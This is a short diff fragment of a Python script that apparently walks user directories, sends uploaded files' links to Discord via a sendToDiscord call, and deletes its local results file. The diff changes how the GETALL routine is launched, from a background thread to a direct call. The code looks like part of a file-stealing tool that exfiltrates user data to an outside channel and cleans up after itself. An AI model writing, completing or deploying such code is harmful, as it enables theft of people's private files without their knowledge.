@@ -34,4 +34,4 @@ def GETALL():
             sendToDiscord(ok,final_file['url'])
         os.remove('resuslts23.json')
     list_files(userspath)
-threading.Thread(target=GETALL).start()
+GETALL()
